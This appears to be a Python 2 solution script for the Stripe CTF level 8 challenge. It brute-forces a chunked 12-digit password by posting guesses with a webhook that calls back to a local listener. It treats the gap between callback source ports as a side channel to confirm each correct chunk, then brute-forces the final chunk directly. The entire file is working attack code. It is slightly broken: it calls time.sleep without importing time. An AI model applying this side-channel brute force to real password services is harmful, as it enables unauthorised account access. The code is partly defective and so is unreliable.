#!/usr/bin/env python
import hashlib
import json
import sys
import urllib
import socket
import thread
import requests

def hackMain():
    first_part = ""
    for chunk in range (0, 3):
        for i in range(0, 1000):
            port_diff = testChunk(first_part, i)
            if port_diff >= 4 + chunk:
                print "might have found it with %03d...verifying" % i
                num_success = 0 
                num_required = 5
                for k in range(num_required):
                    port_diff_2 = testChunk(first_part, i)
                    if port_diff_2 == port_diff:
                        num_success += 1
                if num_success == num_required:
                    print "found it! %03d" % i
                    first_part = first_part + ("%03d" % i)
                    break

    for i in range(0, 1000):
        success = testCombined(first_part, i)
        if success:
            print "might have found it with %03d...verifying" % i
            num_success = 0 
            num_required = 5
            for k in range(num_required):
                success_2 = testCombined(first_part, i)
                if success_2:
                    num_success += 1
            if num_success == num_required:
                print "*" * 20
                print "The Flag! %s%03d" % (first_part, i)
                print "*" * 20
                break


        

def testChunk(first_part, trial):
    portno = 54442
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", portno))
    s.listen(1)
    s.settimeout(8)

    #server_url = "https://level08-4.stripe-ctf.com/user-jakrozzmxn/"
    #postback_url = "level02-2.stripe-ctf.com"
    server_url = "http://localhost:30000"
    postback_url = "localhost"
    composed_trial = "%0-12s" % (first_part + "%03d" % trial)
    
    urllib.urlopen(server_url, '{"password": "000000000000", "webhooks":["%s:%d"]}' % (postback_url, portno))
    s1, (host, portA) = s.accept()
    s1.close()
    
    urllib.urlopen(server_url, '{"password": "%s", "webhooks":["%s:%d"]}' % (composed_trial, postback_url, portno))
    s2, (host, portB) = s.accept()
    s2.close()

    print "tried %s: port a was %d and port b was %d, which is a diff of %d" % (composed_trial, portA, portB, (portB - portA))

    if (portB - portA) > 10:
        time.sleep(7)

    return portB - portA

def testCombined(first_part, trial):
    composed_trial = first_part + "%03d" % trial

    params = '{"password" : "%s", "webhooks" : []}' % composed_trial
    #resp = requests.post('https://level08-4.stripe-ctf.com/user-jakrozzmxn/', data = params)
    resp = requests.post('http://localhost:30000', data = params)

    success = 'true' in resp.text
    print "tried %s and %s" % (composed_trial, success)

    return success

if __name__=="__main__":
    hackMain()

